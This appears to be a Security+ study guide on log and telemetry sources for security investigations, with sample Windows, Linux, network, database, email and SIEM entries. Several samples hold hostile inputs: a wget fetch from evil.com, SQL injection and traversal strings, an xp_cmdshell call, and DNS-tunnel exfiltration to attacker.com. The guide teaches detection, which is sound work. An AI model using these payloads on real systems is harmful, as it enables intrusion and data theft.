01Why Data Sources Matter for InvestigationsEvidence · Visibility · Context

Security investigations depend entirely on data — logs, telemetry, metadata, and captured traffic. Without the right data sources, analysts are blind. With comprehensive data collection, every attacker action leaves a trail. The question is whether you were collecting the right data before the incident occurred.

The Fundamental Investigation Challenge

# The bitter truth about investigations: Incident discovered today: Question: "How did attacker get in 6 weeks ago?" Without logging: "We don't know — no logs" With short retention: "Logs only kept 7 days — gone" With gaps in coverage: "That server wasn't logging — blind spot" With full coverage: "Timeline reconstructed — found it ✓" # Data collection must happen BEFORE the incident # You can't go back in time and add logging # What you collect today is what saves you tomorrow Common investigation failures: × "We don't log that system — it's legacy" × "Log retention was only 14 days — data overwritten" × "No network capture on that segment" × "DNS logs not enabled on that server" × "Command-line auditing wasn't turned on" × "Cloud API logs weren't configured"

Data Source Categories

🖥️ System Logs

OS-level events — authentication, process execution, privilege use, system changes. Windows Event Log, Linux syslog, macOS Unified Log. Covered in Tab 2.

📡 Network Logs

Firewall logs, NetFlow, packet captures, DNS queries, DHCP assignments, proxy logs. Show who talked to whom. Covered in Tab 3.

📦 Application Logs

Web server access logs, database query logs, email logs, API logs, authentication logs. What applications did. Covered in Tab 4.

☁️ Cloud & Identity

AWS CloudTrail, Azure Activity Log, IAM events, SSO logs, SaaS audit trails. What happened in cloud environments. Covered in Tab 5.

🔬 Endpoint Telemetry

EDR agent data — process trees, file changes, registry modifications, network connections from endpoints. Covered in Tab 6.

🏷️ Metadata & Context

File metadata, email headers, image EXIF data, document properties. Often overlooked but rich in investigative value. Covered in Tab 7.

02System LogsWindows · Linux · macOS

System logs record OS-level activity — who logged in, what processes ran, what changed. They form the backbone of most security investigations and are often the first place analysts look.

Windows Event Log — The Most Critical

Windows records security-relevant events in structured Event Log entries, each with a unique Event ID. Knowing which IDs matter is essential for investigations and directly tested on Security+.

Authentication Events — Must Know

4624 Successful Logon Who logged in, from where, what logon type. Essential for tracking access. Logon type 3 = network, type 10 = remote interactive (RDP). Monitor
4625 Failed Logon Failed authentication attempt. Spike = brute force. Many accounts same time = password spray. Sub-status codes reveal why (wrong password, account locked, etc). Alert
4648 Logon with Explicit Credentials Process used credentials explicitly (runas). Pass-the-hash, lateral movement indicator. Common in Mimikatz-based attacks. Flag when unexpected. Alert
4768 Kerberos TGT Requested Authentication service ticket requested. Used for: Kerberoasting detection, pass-the-ticket attacks, golden ticket detection. Failure code 0x12 = account disabled. Watch
4769 Kerberos Service Ticket Requested Service ticket requested for specific resource. Kerberoasting: bulk 4769 events for service accounts with RC4 encryption. Mass requests = credential harvesting. Alert

Account Management Events

4720 User Account Created New user account created. Unauthorized account creation = backdoor. After-hours account creation = high suspicion. Track who created it. Alert
4722 User Account Enabled Disabled account re-enabled. Orphaned account reactivated = potential attacker using old account. Correlate with who enabled it and when. Alert
4732 Added to Security Group User added to privileged group (Domain Admins, local Admins). Privilege escalation indicator. Alert immediately for Domain Admins group changes. Critical

Privileged Activity Events

4672 Special Privileges Assigned Logon with sensitive privileges (admin logon). Every admin session tagged with this. Unexpected admin logons = investigate. Track admin account usage. Monitor
4698 Scheduled Task Created New scheduled task created — primary persistence mechanism for malware. Unexpected task by non-admin = red flag. Review task binary path carefully. Alert
4719 Audit Policy Changed System audit policy modified. Attacker disabling logging to cover tracks. Auditing disabled = CRITICAL ALERT — assume attacker active and trying to hide. Critical
7045 New Service Installed New Windows service installed. Malware persistence mechanism. Unexpected service = investigate. Service running from temp folder = high suspicion. Alert
4688 New Process Created Process creation with command-line logging. Critical for detecting: malware execution, PowerShell abuse, LOLBins, lateral movement tools. Requires command-line auditing enabled. Required

Linux / Unix Logs — Key Files

/var/log/auth.log (Debian) or /var/log/secure (RHEL)

All authentication events — SSH logins, sudo usage, PAM authentication. Shows: who logged in via SSH, failed attempts, sudo command execution, su usage. Most important Linux security log.

# Successful SSH login: Mar 15 02:14:33 server sshd: Accepted publickey for admin from 185.220.101.34 port 54231 ssh2 # Sudo command (who ran what as root): Mar 15 02:15:01 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://evil.com/malware

/var/log/syslog and Others

  • /var/log/syslog — general system messages
  • /var/log/kern.log — kernel messages (rootkits, driver issues)
  • /var/log/cron — scheduled task execution (persistence)
  • /var/log/dpkg.log / yum.log — software installation
  • /var/log/wtmp — login history (binary — use last)
  • /var/log/lastlog — last login per user
  • ~/.bash_history — command history (can be cleared)

Syslog Protocol — How Logs Are Transmitted

03Network Log SourcesFirewall · NetFlow · DNS · PCAP

Network logs reveal who communicated with whom, when, how much data moved, and which protocols were used. Even when endpoint logs are unavailable or tampered with, network logs preserve the communication record.

🔥 Firewall Logs Allow + Deny records
Records every connection attempt — allowed and denied. Shows: source IP, destination IP, port, protocol, bytes transferred, duration, rule matched. Essential for: identifying C2 connections, data exfiltration volume, port scanning, unauthorized access attempts. Inbound denies reveal reconnaissance; outbound allows reveal data movement.
# Firewall log format (Palo Alto NGFW): 2024-03-15 02:14:33 ALLOW tcp 10.0.0.47:54231 → 8.8.8.8:443 bytes_sent:847 bytes_recv:12047 duration:4s app:ssl 2024-03-15 02:17:44 DENY tcp 10.0.0.47:53291 → 185.220.101.34:4444 reason:threat-detected category:c2-communication # Investigating data exfiltration — firewall log query: Source: internal (10.0.0.0/8) Action: ALLOW Bytes_sent: > 100MB Destination: NOT internal Time: 22:00 to 06:00 ← after hours! Result: 847MB sent to 104.21.15.32 at 2am ← investigate
📊 NetFlow / IPFIX Traffic metadata — not content
Records conversation metadata for every network flow. Shows: who talked to whom, how much data, what protocol, how long — but NOT the actual content. Lightweight — store months of data where PCAP would be impractical. Essential for: detecting data exfiltration by volume, identifying lateral movement patterns, spotting C2 beaconing by timing regularity.
# NetFlow record — connection metadata: SrcIP:10.0.4.22 DstIP:185.220.x.x SrcPort:49832 DstPort:443 Proto:TCP Bytes:4,793,244,800 Pkts:3,247,891 Start:2024-03-10 01:14:22 End:2024-03-10 01:52:44 Duration:38min Direction:outbound # 4.7 GB sent to suspicious IP at 1am = exfiltration indicator # NetFlow beaconing detection: Src:10.0.1.47 → Dst:evil-c2.com:443 Connections every: 5min 00sec ± 3sec ← too regular = C2 28 connections over 2.5 hours = Malware C2 beaconing pattern detected # Tools: SolarWinds NTA, ntopng, Cisco Stealthwatch # Protocol: NetFlow v5/v9 (Cisco), IPFIX (standard)
🌐 DNS Logs Domain resolution records
Every domain lookup recorded — timestamp, querying host, domain queried, response. Invaluable for investigations because: malware must resolve C2 domains, DNS tunneling creates unusual query patterns, DGA malware generates many failed lookups, DNS logs persist even after endpoint compromise.
# DNS log entries: 2024-03-15 02:14:31 10.0.1.47 QUERY evil-c2-server.ru → NXDOMAIN 2024-03-15 02:14:32 10.0.1.47 QUERY a1b2c3d4e5.evil.ru → 185.220.101.34 2024-03-15 02:14:37 10.0.1.47 QUERY f6g7h8i9j0.evil.ru → 185.220.101.34 2024-03-15 02:14:42 10.0.1.47 QUERY k1l2m3n4o5.evil.ru → 185.220.101.34 # DGA pattern: many unique subdomains → same domain # = Domain Generation Algorithm malware ← investigate 10.0.1.47 # DNS tunneling detection: 2024-03-15 02:34:12 10.0.3.88 QUERY c2VjcmV0ZGF0YWhlcmU=.exfil.attacker.com # Base64 encoded data IN the DNS query name # = DNS tunneling exfiltration detected # What DNS logs reveal that firewall logs miss: HTTPS to bad IP blocked by firewall? DNS query still logged BEFORE firewall drops it ✓
📦 Packet Capture (PCAP) Full content — investigation gold
Full packet capture contains the actual data — headers AND payload. Can reconstruct: exact malware downloaded, credentials transmitted in plaintext, commands sent to compromised host, data exfiltrated. High storage cost — not continuous on all links. Triggered capture on suspicious activity is common approach.
# Wireshark analysis of suspected C2 traffic: Filter: ip.addr == 185.220.101.34 Frame 1: TCP SYN → connection established Frame 2: TLS ClientHello → encrypted channel established Server name: definitely-not-evil.com Certificate: self-signed, 1 day old ← suspicious Frame 3-N: encrypted data exchange # With SSL inspection (NGFW): Decrypted payload reveals: POST /gate.php HTTP/1.1 {"cmd":"whoami","host":"WORKSTATION-47","user":"sarah.chen"} = Active C2 communication — command and control confirmed # PCAP tools: Wireshark, tcpdump, NetworkMiner, Zeek/Bro # Storage: 1Gbps link = ~450GB/hour — selective capture only
📍 DHCP Logs IP-to-host mapping
Maps IP addresses to hostnames and MAC addresses at specific times. Critical for: identifying "which device had this IP at 2am?", detecting rogue devices (unknown MACs), tracking device movement around network, resolving IP addresses in other logs to hostnames.
# Investigation: firewall log shows 10.0.1.47 exfiltrating data at 2am # DHCP log tells us which device that was: 2024-03-15 01:47:22 DHCPACK 10.0.1.47 → MAC:aa:bb:cc:dd:ee:ff Hostname: LAPTOP-SARAHCHEN Lease: 8 hours Answer: Sarah Chen's laptop had that IP at 2am ✓ # Without DHCP logs: "some device had IP 10.0.1.47" — useless # With DHCP logs: "Sarah Chen's laptop" — actionable
🔗 Proxy / Web Filtering Logs Web access records
Records all web requests made through the corporate proxy — URL, user, timestamp, bytes, category, action. Even for HTTPS — proxy sees the URL (SNI) even if not decrypting. Catches: malware callbacks, data upload to cloud services, policy violations, credential theft via phishing site visits.
# Proxy log — Squid/Zscaler/Bluecoat format: 2024-03-15 14:23:47 ALLOWED [email protected] GET https://mail.google.com/ — 200 OK — 47KB Category: Web-based Email 2024-03-15 14:24:12 BLOCKED [email protected] GET https://credential-harvester.evil.com/login Category: Phishing — Action: BLOCKED User attempted to visit known phishing site 2024-03-15 02:17:33 ALLOWED (user not identified — after hours) POST https://transfer.sh/upload — 847MB uploaded Category: File Sharing — Action: SHOULD HAVE BLOCKED
// Scenario — Network Logs Reconstruct Breach
# No endpoint evidence (server reimaged) — network logs save the day: DNS logs: Day -45: LAPTOP-047 resolved malware-dropper.ru → got IP Day -44: LAPTOP-047 DNS queries → DGA pattern (100+ unique domains) Day -44: confirmed-C2.ru → 185.220.x.x (47 daily queries) Firewall logs: Day -44: LAPTOP-047 → 185.220.x.x:443 → ALLOWED (looks like HTTPS) Day -44: LAPTOP-047 lateral → FILE-SERVER-02 SMB → ALLOWED Day -10: FILE-SERVER-02 → FILE-SERVER-01 SMB → ALLOWED Day -10: FILE-SERVER-01 → DC-01 LDAP → ALLOWED NetFlow: Day -8: DC-01 → 185.220.x.x → 47GB transferred overnight = AD database exfiltrated (DC + 47GB = likely ntds.dit) Proxy logs: Day -45: sarah.chen → malware-dropper.ru/office-update.exe → 200 OK = initial infection via drive-by download Complete attack chain reconstructed from network logs alone: Drive-by → C2 → lateral movement → domain → AD exfil ✓

04Application & Service LogsWeb · Database · Email · VPN

Application logs record what users and systems actually did inside applications. They reveal the "what" and "how" of an attack that network logs can't show — SQL queries run, web pages accessed, emails sent, files downloaded.

🌍 Web Server Access Logs Apache · Nginx · IIS
Every HTTP/HTTPS request to a web server logged — source IP, timestamp, method, URL, status code, bytes, user-agent. Critical for: detecting web attacks (SQLi, XSS, directory traversal), identifying compromised pages, finding C2 web shells, discovering data exfiltration via HTTP POST.
# Apache/Nginx Combined Log Format: 185.220.101.34 - - [15/Mar/2024:02:14:33 +0000] "GET /wp-admin/admin-ajax.php?action=test HTTP/1.1" 200 47 "http://attacker.com" "Mozilla/5.0 Nikto/2.1.6" # User-agent "Nikto" = vulnerability scanner! # SQL injection attempt: 192.168.1.100 - - [15/Mar/2024:14:23:07 +0000] "GET /products?id=1'+OR+'1'='1 HTTP/1.1" 200 8472 # URL contains SQL injection payload in query parameter # Web shell access: 185.220.101.34 - - [15/Mar/2024:03:47:22 +0000] "POST /uploads/image.php.jpg HTTP/1.1" 200 127 # POST to uploaded file = web shell execution # Directory traversal: 10.0.0.1 - - [15/Mar/2024:11:22:00 +0000] "GET /download?file=../../etc/passwd HTTP/1.1" 200 1847
🗄️ Database Logs Query audit · Access records
Database audit logs record who ran what queries, when, from where, and what data was returned. Detects: SQL injection that reached the database, unauthorized bulk data exports, privileged stored procedure execution (xp_cmdshell), database account misuse, schema changes.
# SQL Server Audit Log: 2024-03-15 02:14:47 | session=847 | login=webapp_user from=10.0.0.1 | query: SELECT * FROM customers WHERE 1=1 -- (SQL injection) rows_returned: 250,847 ← entire customer table dumped # Suspicious stored procedure: 2024-03-15 02:17:01 | session=891 | login=sa_account query: EXEC xp_cmdshell 'whoami' ← OS command execution! result: 'NT AUTHORITY\SYSTEM' # Privilege escalation via DB: 2024-03-15 02:18:33 | login=sa_account query: ALTER LOGIN admin ENABLE; ← re-enabling disabled account
📧 Email Logs Message tracking · Gateway
Email gateway and server logs record every message — sender, recipients, subject, attachments, routing, actions taken. Essential for: tracing phishing campaigns, investigating BEC fraud, finding data exfiltration via email, identifying compromised accounts sending spam/phishing internally.
# Exchange/O365 Message Tracking Log: 2024-03-15 14:23:47 | MessageId: <[email protected]> Sender: [email protected] Recipients: [email protected] Subject: "Urgent Wire Transfer Request" Attachment: Invoice_March.zip (contains macro) Action: DELIVERED ← should have been blocked # Compromised account sending phishing: 2024-03-15 22:47:01 | Sender: [email protected] Recipients: [email protected] (500 recipients!) Subject: "Check this out" Attachment: malware.exe IP: 185.220.101.34 ← NOT Sarah's normal IP = compromised # Mass email forwarding (insider threat / BEC): Forwarding rule: ALL MAIL → [email protected] Created: 2024-03-10 (5 days ago — missed)
🔐 VPN and Remote Access Logs Connection records
Records VPN connections — username, source IP, connection time, session duration, bytes transferred. Critical for: impossible travel detection (two countries same time), detecting use of compromised credentials, identifying unauthorized after-hours access, tracking remote worker activity.
# VPN access log: 2024-03-15 09:14:22 | CONNECT | user:john.smith source_ip: 96.127.x.x (Toronto, Canada) duration: 8hr 42min | bytes: 2.1GB 2024-03-15 11:47:33 | CONNECT | user:john.smith ← SAME USER source_ip: 194.165.x.x (Moscow, Russia) ← SAME TIME Impossible travel! John can't be in Canada AND Russia # After-hours access pattern: user:sarah.chen normally: Mon-Fri 8am-6pm EST 2024-03-15 02:14:33 CONNECT sarah.chen source: 185.220.x.x — 2am Sunday = Credential compromise or insider threat
📜 Authentication / IAM Logs SSO · MFA · Directory
Identity provider logs — Okta, Azure AD, Active Directory — record every authentication event across all connected applications. One stop for: all login events, MFA outcomes, SSO token issuance, suspicious sign-in patterns, conditional access policy outcomes.
# Azure AD / Okta sign-in log: 2024-03-15 02:14:33 | user:[email protected] app: Microsoft 365 | ip:185.220.101.34 location: Netherlands (new) | device: unknown MFA: required — FAILED (user denied push) risk_level: HIGH | result: BLOCKED 2024-03-15 02:17:12 | user:[email protected] app: Microsoft 365 | ip:185.220.101.34 MFA: required — APPROVED ← MFA fatigue — user approved! result: SUCCESS | account compromised # Password spray detected in IAM logs: 02:14-02:15 | 500 different users, 1 failed attempt each All from: same IP range (185.220.0.0/16) = Password spray attack

05Cloud & Identity LogsCloudTrail · Azure · SaaS

Cloud environments generate their own audit trails — every API call, resource creation, configuration change, and access event is logged. Cloud logs are often more comprehensive than on-premises logs because cloud providers build logging into every action by default.

☁️ AWS CloudTrail Every API call logged
Records every AWS API call — who called what, from where, at what time. Captures: console logins, CLI commands, SDK calls, changes to every AWS resource. If it happened in AWS — CloudTrail has a record. Critical to enable in ALL regions and ensure logs are shipped to separate account (attacker can't delete them).
# CloudTrail — high-value investigation events: Root account login (should NEVER happen normally): eventName: ConsoleLogin | userType: Root sourceIPAddress: 185.220.101.34 ← immediate alert! Azure Activity Log records all control plane operations — VM creation, security group changes, policy updates. Azure Entra ID (formerly Azure AD) sign-in logs and audit logs record all authentication and directory changes. Microsoft 365 Unified Audit Log covers all M365 services.

📋 SaaS Application Audit Logs Salesforce · GitHub · Slack
Every major SaaS platform provides audit logs via their admin console or API. These are increasingly important as more business happens in cloud apps. Integration with SIEM is essential — SaaS audit logs sitting in vendor console are hard to correlate with other events.

Cloud Log Architecture Best Practices

Enable Logging Everywhere

CloudTrail: enable in ALL regions (not just primary). VPC Flow Logs: on every VPC. S3 server access logging. Load balancer logs. Lambda function logs. Default: many cloud services log nothing until you enable it.

Protect Cloud Logs from Deletion

Ship CloudTrail logs to separate AWS account with strict IAM. Attacker who compromises your account cannot delete logs in a different account. Enable S3 Object Lock (WORM) on log buckets. Alert on any attempt to disable logging.

CloudTrail StopLogging event = CRITICAL ALERT Delete S3 log bucket = CRITICAL ALERT Modify log bucket policy = HIGH ALERT

06Endpoint Logs & EDR TelemetryProcess · File · Registry · Network

Endpoint logs provide granular visibility into what happened on individual systems — far more detail than network logs can provide. EDR agents collect continuous behavioral telemetry that traditional event logs miss.

Sysmon — Enhanced Windows Logging

🔬
What Is Sysmon?
System Monitor (Sysmon) is a free Windows Sysinternals tool that provides far more detailed logging than standard Windows Event Log. Captures: process creation with command lines, network connections, file creation timestamps, driver loading, registry changes, named pipe activity. Essential for security monitoring — many SOCs consider it mandatory. Free from Microsoft.
# Sysmon event IDs — key ones for investigations: Event ID 1: Process Creation → full command line, parent process, hash, user context Event ID 3: Network Connection → process making connection, destination IP, port, DNS name Event ID 7: Image (DLL) Loaded → DLL injection detection Event ID 8: CreateRemoteThread → thread injection into another process — classic malware technique Event ID 10: ProcessAccess (LSASS access) → credential dumping detection (Mimikatz reads LSASS) Event ID 11: FileCreate → new file created — dropped malware, web shells Event ID 13: Registry Value Set → persistence via registry Run keys Event ID 15: FileCreateStreamHash (Alternate Data Streams) → malware hiding in ADS Event ID 22: DNS Query → which process made which DNS query (C2 detection) # Example Sysmon Event 1 — process creation: EventID: 1 | Image: C:\Windows\Temp\malware.exe CommandLine: malware.exe -c "powershell -enc [base64]" ParentImage: C:\Users\sarah\Downloads\invoice.pdf.exe User: COMPANY\sarah.chen Hashes: MD5=deadbeef1234,SHA256=abc123... → PDF spawning executable = malware ← high confidence

07Metadata & Contextual Data SourcesFile · Email · Image · Context

Metadata is "data about data" — information that describes, explains, or gives context to other data. For investigations, metadata often provides the crucial context that turns a suspicious event into a confirmed incident.

Other Contextual Data Sources

Physical / Badge Access Logs

Building access system records: who entered/exited what area and when. Correlate with: network login times (should match physical presence), data center access before equipment went missing, alibi confirmation or contradiction. "The logs say John was in the data center at 3am but he claims he was home asleep."

CCTV / Video

Physical surveillance footage. Corroborates badge access logs. Identifies who plugged in a USB device. Shows who was present when equipment was accessed. Metadata: timestamp, camera ID, resolution. Must be collected quickly — often overwritten after 30-90 days.

OSINT — Open Source Intelligence

Publicly available information useful in investigations. Shodan (internet device discovery), WHOIS records, social media, job postings (reveals technology stack), breach databases, threat actor forums (dark web with caution), certificate transparency logs.

Shodan: "org:TargetCompany port:3389 open" → finds exposed RDP servers WHOIS: when was malicious domain registered? → new domain (1 day old) = suspicious Certs: Certificate Transparency logs → find all subdomains of target

Threat Intelligence Feeds

External context enriching internal logs. IOC feeds: known-bad IPs, domains, hashes. MITRE ATT&CK technique context. CISA KEV — actively exploited CVEs. ISAC feeds (industry-specific). VirusTotal, Shodan, AbuseIPDB APIs for enrichment.

Time Synchronization — Why It Matters

# Investigation disaster — time not synchronized: Server A clock: 14:32:15 (EST) Server B clock: 14:35:47 (EST — 3.5 min fast) Firewall clock: 14:30:02 (EST — 2 min slow) Attack timeline investigation: "Firewall: connection from 14:30:02" "Server B: user logged in at 14:35:47" Question: "Did the connection happen BEFORE or AFTER login?" Answer: impossible to determine — clocks unsynchronized With NTP (all clocks synchronized): Firewall: connection at 14:32:15 Server B: login at 14:32:16 (1 second later) Clear: connection triggered login = lateral movement confirmed # NTP — Network Time Protocol: Port: UDP 123 Source: authoritative NTP server (NIST, pool.ntp.org) All systems: sync to same source Investigation: timestamps are reliable and correlatable # Log correlation requires synchronized time # Time skew of even 1 minute destroys investigation quality

08SIEM — Correlating All Data SourcesAggregate · Correlate · Investigate

SIEM (Security Information and Event Management) is the central platform that aggregates all data sources and enables correlation — finding patterns across hundreds of systems that no analyst could see manually. The value of SIEM multiplies with each new data source connected.

How SIEM Transforms Raw Logs into Investigations

# Individual log entries — each looks harmless alone: DNS log: 10.0.1.47 queried evil-c2.ru at 02:14:31 Firewall log: 10.0.1.47 → 185.220.x.x:443 ALLOWED at 02:14:33 DHCP log: 10.0.1.47 = LAPTOP-SARAH (MAC: aa:bb:cc:dd) AD log: sarah.chen logged in to LAPTOP-SARAH at 09:14 (normal) EDR log: LAPTOP-SARAH: powershell.exe spawned from word.exe 02:14:29 Proxy log: sarah.chen downloaded invoice.doc at 14:23:47 (previous day) # SIEM correlates all of these → single investigation view: SIEM ALERT: Possible Malware — LAPTOP-SARAH / sarah.chen Timeline: 14:23:47 — Sarah downloaded suspicious .doc 02:14:29 — Word spawned PowerShell (macro executed overnight) 02:14:31 — DNS query to known malicious domain 02:14:33 — Connection established to C2 server Attack chain: phishing doc → macro → PowerShell → C2 Affected: sarah.chen / LAPTOP-SARAH C2: 185.220.x.x (Netherlands) — Tor infrastructure Recommended actions: [Isolate endpoint] [Lock account] [Create ticket] 6 separate log entries → 1 clear attack narrative ✓

Key SIEM Investigation Techniques

Pivoting

Start with one indicator and pivot to related data. IP address in alert → pivot to all connections from that IP → pivot to other hosts that connected to same C2 → find all infected hosts. Each pivot reveals more scope.

Start: Alert on 10.0.1.47 → C2 traffic Pivot 1: What else did 10.0.1.47 connect to? → Found lateral movement to 10.0.2.33 Pivot 2: What other hosts connected to C2? → Found 10.0.3.55 also infected Pivot 3: What user is on 10.0.3.55? → DHCP: sarah.chen — scope found

Timeline Analysis

Build chronological view of all events related to an incident. Identify: when did it start (patient zero), how long undetected (dwell time), sequence of attacker actions, what was affected and when, are there events before what we think is the start.

Baseline Deviation

Compare current activity to historical baseline. "User sarah.chen normally downloads 50MB/day — today she downloaded 47GB." UEBA builds these baselines automatically and flags deviations as alerts. Most effective for insider threats.

Field Extraction & Parsing

SIEM normalizes different log formats into common schema. Apache logs, Windows events, firewall logs — all have different formats but SIEM maps them to common fields. src_ip, dst_ip, user, action — consistent across all sources.
